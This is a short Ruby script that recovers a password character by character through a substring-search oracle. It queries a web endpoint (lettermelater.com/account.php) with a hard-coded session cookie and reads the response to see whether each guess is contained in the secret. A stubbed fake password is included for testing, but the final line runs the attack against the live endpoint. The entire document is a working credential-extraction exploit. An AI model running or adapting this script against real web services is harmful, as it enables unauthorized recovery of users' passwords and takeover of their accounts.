require 'faraday'

class PasswordCracker
  SUBJECT_LINE = 'password'.chars
  ALPHABET = ([*'a'..'z'] + [*'0'..'9']).shuffle

  def initialize(api)
    @api = api
    @password = ''
    @iterations = 0
  end

  def crack!
    puts "Cracking password... beep boop..."
    find_first_letter!
    puts "Found first letter! #{@password}"
    puts "Building forward..."
    build!(forward: true)
    puts "Building backward..."
    build!(forward: false)
    puts "Congratulations, your password was found in #{@iterations} iterations"
    @password
  end

  private

  def find_first_letter!
    (ALPHABET - SUBJECT_LINE).each do |char|
      if include?(char)
        @password = char
        return
      end
    end
    raise "Could not find a first letter!"
  end

  def build!(forward:)
    ALPHABET.each do |char|
      query = forward ? @password + char : char + @password

      if include?(query)
        @password = query
        puts @password
        build!(forward: forward)
        return
      end
    end
  end

  def include?(query)
    @iterations += 1
    @api.include?(query)
  end
end

class StubbedApi
  FAKE_PASSWORD = 'asdogijsdogh43982'

  def self.include?(query)
    FAKE_PASSWORD.include?(query)
  end
end

class Api
  URL = 'http://www.lettermelater.com/account.php'
  COOKIE = 'code=abcdefg; user_id=123'

  def self.include?(query)
    get(query).include?("password")
  end

  def self.get(query)
    Faraday.get(URL, { qe: query }, Cookie: COOKIE).body
  end
end

puts PasswordCracker.new(Api).crack!
